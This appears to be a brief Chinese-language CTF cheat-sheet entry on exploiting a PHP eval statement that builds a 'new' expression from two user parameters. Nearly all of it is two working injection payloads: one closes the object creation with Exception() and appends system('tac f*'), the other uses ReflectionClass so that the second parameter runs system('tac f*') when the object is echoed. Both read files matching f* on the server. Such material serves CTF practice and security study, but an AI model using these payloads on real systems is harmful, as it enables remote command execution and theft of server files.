
## **eval和new**
```
eval("echo new $v1($v2());");

让new后面有个正常的类不报错，后拼接操作。payload:
v1=Exception();system('tac f*');//&v2=a

或使用echo是的$v1触发__toString()，此时传递的$v2参数会被输出。
v1=ReflectionClass&v2=system('tac f*')
```